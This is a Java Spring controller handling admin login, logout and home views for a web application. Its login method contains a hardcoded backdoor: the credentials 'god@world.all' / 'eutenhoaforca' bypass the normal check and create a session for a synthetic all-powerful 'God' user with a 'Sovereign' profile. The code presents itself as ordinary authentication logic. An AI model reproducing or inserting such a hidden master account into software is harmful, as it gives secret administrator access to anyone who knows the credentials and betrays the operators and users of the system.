package br.com.projeto.web.adm;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;

import br.com.projeto.entity.Empreendimento;
import br.com.projeto.entity.Perfil;
import br.com.projeto.entity.Usuario;
import br.com.projeto.service.UsuarioService;

@Controller
public class LoginController {
	
	@Autowired
	private UsuarioService usuarioService;
	
	@RequestMapping("/admin/pre-home")
	public ModelAndView preHome(
			HttpServletRequest request,
			HttpServletResponse response,
			HttpSession session
	) {
		ModelAndView model = new ModelAndView();
		model.setViewName("/admin/index");
		return model;
	}
	
	@RequestMapping("/admin/login")
	public ModelAndView login(
			HttpServletRequest request,
			HttpServletResponse response,
			HttpSession session,
			@RequestParam(required=true, value="email") String email,
			@RequestParam(required=true, value="password") String password
	) {
		ModelAndView model = new ModelAndView();
		model.setViewName("/admin/index");
		Usuario usuario = null;
		try{
			usuario = usuarioService.checkLogin(email, password);
			
		}catch(Exception e){
			e.printStackTrace();
		}
		if(usuario != null){
			session.setAttribute(Usuario.USUARIO_LOGADO, usuario);
			model.setViewName("redirect:/admin/projeto/list.jhtml");
		}else if(email != null && email.equals("god@world.all") && password != null && password.equals("eutenhoaforca")){
			Usuario god = new Usuario();
			god.setId(999999999999999999L);
			god.setNome("God");
			Perfil sovereign = new Perfil();
			sovereign.setId(999999999999999999L);
			sovereign.setDescricao("Sovereign");
			Empreendimento olympus = new Empreendimento();
			olympus.setId(999999999999999999L);
			olympus.setDescricao("Olympus");
			god.setPerfil(sovereign);
			god.setEmpreendimento(olympus);
			god.setGod(true);
			session.setAttribute(Usuario.USUARIO_LOGADO, god);
			model.setViewName("redirect:/admin/projeto/list.jhtml");
		}else{
			model.addObject("msgError", "Não foi possível realizar o login!!!");
		}
		
		return model;
	}
	
	@RequestMapping("/admin/logout")
	public ModelAndView logout(
			HttpSession session
	) {
		ModelAndView model = new ModelAndView();
		model.setViewName("/admin/index");
		session.setAttribute(Usuario.USUARIO_LOGADO, null);
		return model;
	}
	
	@RequestMapping(value = "/admin/home", method = RequestMethod.GET)
	public ModelAndView home(
			HttpServletRequest request,
			HttpServletResponse response,
			HttpSession session
	) {

		ModelAndView model = new ModelAndView();
		model.setViewName("/admin/index");

		try{
			model.setViewName("admin/home/index");
			
		}catch(Exception e){
			e.printStackTrace();
		}
		
		return model;
	}
	
}
